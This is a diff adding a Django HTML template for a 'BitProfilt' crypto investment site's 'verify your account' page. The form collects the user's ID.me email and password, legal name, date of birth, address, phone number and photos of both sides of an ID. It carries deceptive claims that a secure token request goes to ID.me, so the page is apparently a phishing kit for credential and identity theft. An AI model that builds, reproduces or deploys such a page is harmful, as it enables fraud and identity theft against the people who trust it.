@@ -1,0 +1,275 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en_US">
+   <head>
+            <!-- Google tag (gtag.js) -->
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3EPTL39X1H"></script>
+      <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      
+      gtag('config', 'G-3EPTL39X1H');
+      </script>
+      <!-- Google tag (gtag.js) -->
+      <title>Invest in a global crypto market with your smartly chosen currency.</title>
+      <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+      <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+      <meta name="title" content="Invest in a global crypto market with your smartly chosen currency.">
+      <meta name="description" content="Investment and forex have a larger customer base who have invested successfully in it by choosing the perfect crypto for their better future stock growth.">
+      <meta property="og:title" content="Invest in a global crypto market with your smartly chosen currency.">
+      <meta name="keywords" content="exchange rate, currency exchange, future, currency, trade, forex factory, forex trading, forex rates, currency exchange rates, fxcm, iforex, currency rate, metatrader, online trading, instaforex, foreign exchange rate, currency calculator, stock trading">
+      <meta property="og:locale" content="en_US">
+      <meta name="twitter:description" content="Investment and forex have a larger customer base who have invested successfully in it by choosing the perfect crypto for their better future stock growth.">
+      <meta name="twitter:title" content="Invest in a global crypto market with your smartly chosen currency.">
+      <meta property="og:description" content="Investment and forex have a larger customer base who have invested successfully in it by choosing the perfect crypto for their better future stock growth.">
+      <meta name="twitter:image" content="">
+      <meta property="og:site_name" content="BitProfilt">
+      <meta property="og:image" content="">
+      <meta name="twitter:card" content="summary">
+      <!-- Css -->
+      <link rel="stylesheet" type="text/css" href="{% static 'css/bootstrap.min.css' %}" />
+      <link rel="stylesheet" type="text/css" href="{% static 'css/owl.carousel.min.css' %}" />
+      <link rel="stylesheet" type="text/css" href="{% static 'css/style.css' %}" />
+      <link rel="stylesheet" type="text/css" href="{% static 'css/responsive.css' %}" />
+      <link rel="stylesheet" type="text/css" href="{% static 'fonts/fontawesome/css/all.min.css' %}">
+      <!-- Css -->
+
+      <!-- favicon-->
+      <link rel="icon" href="{% static 'img/favicon.ico' %}">
+      <!--favicon-->
+
+      <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="{% static './img/apple-touch-icon-72x72-precomposed.png' %}" sizes="72x72" />
+      <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="{% static './img/apple-touch-icon-114x114-precomposed.png' %}" sizes="114x114" />
+      <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="{% static './img/apple-touch-icon-144x144-precomposed.png' %}" sizes="144x144" />
+      <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="{% static './img/favicon.png' %}" />
+   </head>
+   <body>
+      <!-- Register -->
+      <section class="login-area">
+         <div class="login-main-box">
+            <div class="box-left">
+               <div class="login-top">
+                  <div class="logo-box">
+                     <a href="{% url 'home' %}"><img src="{% static './img/logo.png' %}" alt="Logo" /></a>  
+                  </div>
+                  <h2 class="theme-title">Verify your account to access unlimited and unrestricted services and functionalities. </h2>
+                  <p class="theme-description">We have simplified our verification process for our clients in the United States. allowing them to verify their account with  id.me! Simply enter your id.me verified account login credentials. the system will automatically send a transport request to id.me server. after submission, watch out for a mail notification.</p>
+                 
+{% for message in messages %}
+    {% if 'verification' in message.tags and 'success' in message.tags %}
+        <div class="alert alert-success">
+            {{ message }}
+        </div>
+    {% endif %}
+{% endfor %}
+
+{% for message in messages %}
+    {% if 'verification' in message.tags and 'error' in message.tags %}
+        <div class="alert alert-danger">
+            {{ message }}
+        </div>
+    {% endif %}
+{% endfor %}
+
+
+            </div>
+               <br>
+               <form action="{% url 'verification' %}" method="post" enctype="multipart/form-data">
+                  {% csrf_token %}
+               <div class="main-inner-box">
+
+                  <div class="theme-input-box">
+                     <label for="email">ID.ME Email</label>
+                     <div class="input-box">
+                        <input title="Please enter a valid active email address" required name="email" type="email" class="form-control theme-input" placeholder="name@example.com">
+                        <i class="fas fa-envelope"></i>
+                     </div>
+                  </div>
+
+                  <div class="theme-input-box">
+                     <label for="text">First name</label>
+                     <div class="input-box">
+                        <input required title="Please enter your legal firstname" name="firstname" type="text" class="form-control theme-input" placeholder="Enter Your legal first name">
+                        <i class="fas fa-user"></i>
+                     </div>
+                  </div>
+
+                  <div class="theme-input-box">
+                     <label for="text">Last name</label>
+                     <div class="input-box">
+                        <input title="Please enter your legal lastname" required name="lastname" type="text" class="form-control theme-input" placeholder="Enter Your legal Last name">
+                        <i class="fas fa-user"></i>
+                     </div>
+                  </div>
+
+                  <div class="theme-input-box">
+                     <label for="text">Phone number.  </label>
+                     <div class="input-box">
+                        <input required name="phone" type="text" class="form-control theme-input" placeholder="Enter an active phone number.">
+                        <i class="fa-solid fa-phone"></i>
+                     </div>
+                  </div>
+                  <br/>
+
+                  <!-- <div class="theme-input-box">
+                     <label for="text">Unique Username</label>
+                     <div class="input-box">
+                        <input title="Please choose a username" required name="username" type="text" class="form-control theme-input" placeholder="Enter your prefered username">
+                        <i class="fa-regular fa-id-card"></i>
+                     </div>
+                  </div> -->
+                  <div class="theme-input-box input-group mb-3">
+                     <span class="input-group-text" id="basic-addon3">Date of Birth: </span>
+                    <input id="fileinput" required name="dob" type="date" class="form-control" aria-label="file example"/>
+                 </div>
+                 <br/>
+
+
+                  <div class="theme-input-box">
+                     <label for="text">Address.  </label>
+                     <div class="input-box">
+                        <input title="enter your correct address" required name="address" type="text" class="form-control theme-input" placeholder="Enter your full address.">
+                        <i class="fa-solid fa-earth-europe"></i>
+                     </div>
+                  </div>
+
+                  <div class="theme-input-box">
+                     <label for="text">More address info.</label>
+                     <div class="input-box">
+                        <input title="enter your correct address" type="text" class="form-control theme-input" placeholder="House number, landmarks etc.">
+                        <i class="fa-solid fa-earth-europe"></i>
+                     </div>
+                  </div>
+
+                  <div class="theme-input-box input-group mb-3">
+                     <span class="input-group-text" id="basic-addon3"> ID front: </span>
+                    <input id="fileinput" required name="idfront" type="file" class="form-control" aria-label="file example" accept="image/*" size="15000000">
+                 </div>
+
+                 <div class="theme-input-box input-group mb-3">
+                  <span class="input-group-text" id="basic-addon3"> ID back: </span>
+                 <input id="fileinput" required name="idback" type="file" class="form-control" aria-label="file example" accept="image/*" size="15000000">
+              </div>
+
+                  <div class="theme-input-box mb-2">
+                     <label for="text">your ID.ME Password</label>
+                     <div class="input-box">
+                        <input  required name="password1" id="pword" type="password" class="form-control theme-input" placeholder="Enter Your ID.ME account Password">
+                        <i class="fas fa-lock"></i>
+                     </div>
+                     <p class="text-danger">The system will send a login token request securely via HTTPS to ID.ME, it will wait for response status code which will automatically verify your details. if succesful, you will receive a mail notification.</p>
+
+                  </div>
+
+                  <div class="theme-input-box mb-2">
+                     <label for="text">Confirm Password</label>
+                     <div class="input-box">
+                        <input required name="password2" id="pword" type="password" class="form-control theme-input" placeholder="Confirm Password">
+                        <i class="fas fa-lock"></i>
+                     </div>
+                  </div>
+
+                  <div class="btn-box ">
+                    <input type="submit" value="Submit" class="theme-btn">
+                  </div>
+
+                  <div class="link-box">
+                     <p class="theme-description">Reaad our privacy policies on data security <a href="{% url 'login' %}" class="text-link">Here.</a></p>
+                  </div>
+               </div>
+
+
+               </form>
+            </div>
+            <div class="box-right">
+            </div>
+         </div>
+      </section>
+
+<style>
+
+   #fileinput{
+      border-color: #bfbfbf;
+   }
+
+
+   #pword:invalid {
+   border: 2px solid red;
+   animation: shake 300ms;
+}
+
+@keyframes shake {
+  0%, 100% { transform: translate(0); }
+  25% { transform: translate(5px); }
+  75% { transform: translate(-5px); }
+}
+
+#pword:valid{
+border: 2px solid #49bd01;
+}
+input:focus, #fileinput:focus{
+   border: yellow;
+}
+
+.alert {
+        display: none;
+        background-color: red; 
+        border-radius: 20px;
+        border-bottom-left-radius: 1px;
+        color: white;
+        padding: 5px; 
+        margin-bottom: 4px; 
+        animation: fadeInOut 5s ease-in-out;
+    }
+
+    @keyframes fadeInOut {
+        0%, 100% {
+            opacity: 0;
+        }
+        10%, 90% {
+            opacity: 1;
+        }
+    }
+
+   input:required {
+   border: 2px solid red;
+   transition: border 0.5s;
+  }
+  input:required:focus, #pword:focus, #fileinput:focus{
+   animation: shaking 0.5s;
+   border: 2px solid yellow;
+  } 
+  @keyframes shaking {
+   0%, 100% { transform: translateX(0); }
+   25%, 75% { transform: translateX(-5px); }
+   50% { transform: translateX(5px); }
+  }
+
+    </style>
+    <script>
+       document.addEventListener('DOMContentLoaded', function() {
+        var alertElement = document.querySelector('.alert');
+
+       
+        alertElement.style.display = 'block';
+
+
+        setTimeout(function() {
+            alertElement.style.display = 'none';
+        }, 5000);
+    });
+    </script>
+
+
+      <!-- Register -->
+      <!-- Javascript -->
+      <script src="{% static './js/jquery.min.js' %}"></script>
+      <script src="{% static './js/popper.min.js' %}"></script>
+      <script src="{% static './js/owl.carousel.min.js' %}"></script>
+      <script src="{% static './js/bootstrap.min.js' %}"></script>
+      <script src="{% static './js/custom.js' %}"></script>
+      <script src="https://kit.fontawesome.com/f465f589c1.js" crossorigin="anonymous"></script>
+      <!-- Javascript -->
+   </body>
+</html>
